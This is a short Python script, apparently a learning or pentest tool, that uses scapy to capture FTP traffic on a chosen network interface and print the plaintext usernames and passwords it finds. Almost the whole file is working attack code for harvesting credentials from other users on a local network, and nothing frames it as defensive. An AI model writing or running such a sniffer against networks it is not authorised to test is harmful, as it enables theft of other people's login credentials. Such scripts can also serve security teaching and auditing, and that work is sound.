#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-04-2022
#Description: Python program to sniff the local area network for ftp credentials

import optparse
from scapy.all import *

def ftpSniff(pkt):
	dest = pkt.getlayer(IP).dst
	raw = pkt.sprintf('%Raw.load%')
	user = re.findall('(?i)USER (.*)',raw)
	pswd = re.findall('(?i)PASS (.*)',raw)
	if user:
		print("[*] FTP login detected for: " + str(dest))
		print("[+] Username: " + str(user[0]).strip('\r').strip('\n'))
		print("[+] Password: " + str(pswd[0]).strip('\r').strip('\n'))

def main():
	parser = optparse.OptionParser('The usage of the program: '+ '-i<interface>')
	parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
	(options,args) = parser.parse_args()
	if options.interface == None:
		print(parser.usage)
		exit(0)
	else:
		conf.iface = options.interface
	try:
		sniff(filter='tcp port 21', prn=ftpSniff)
	except KeyboardInterrupt:
		exit()
main()

